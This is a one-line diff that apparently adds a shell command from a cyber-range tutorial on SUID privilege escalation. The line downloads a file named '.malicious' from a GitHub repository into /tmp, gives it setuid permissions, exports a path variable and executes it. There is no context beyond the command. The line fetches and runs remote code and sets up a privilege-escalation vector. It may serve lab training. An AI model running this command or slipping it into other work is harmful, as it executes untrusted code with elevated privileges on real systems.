@@ -1,0 +1,1 @@
+wget -O /tmp/.malicious https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/poc; chmod 4755 /tmp/.malicious; export BAD_PATH=/tmp; /tmp/.malicious
